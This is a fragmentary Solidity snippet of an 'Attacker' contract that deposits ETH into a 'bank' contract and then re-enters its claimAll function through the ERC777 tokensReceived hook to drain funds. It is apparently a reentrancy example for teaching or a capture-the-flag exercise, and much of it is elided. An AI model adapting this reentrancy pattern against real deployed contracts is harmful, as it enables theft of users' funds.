...
contract Attacker is AccessControl, IERC777Recipient {
    ...
    */
    function attack(uint256 amt) payable public {
        ...
        // Initiate deposit with specified amount of ETH
        bank.deposit{value: amt}();
        
        // Start reentrancy attack by calling the vulnerable function
        bank.claimAll();
    }
    ...
    */
    function tokensReceived(
        ...
        // Recursion control to prevent infinite loop
        if (depth < max_depth) {
            depth++;
            emit Recurse(depth);
            bank.claimAll(); // Re-entrantly calls the claimAll to drain funds
            depth--;
        }
    }
}
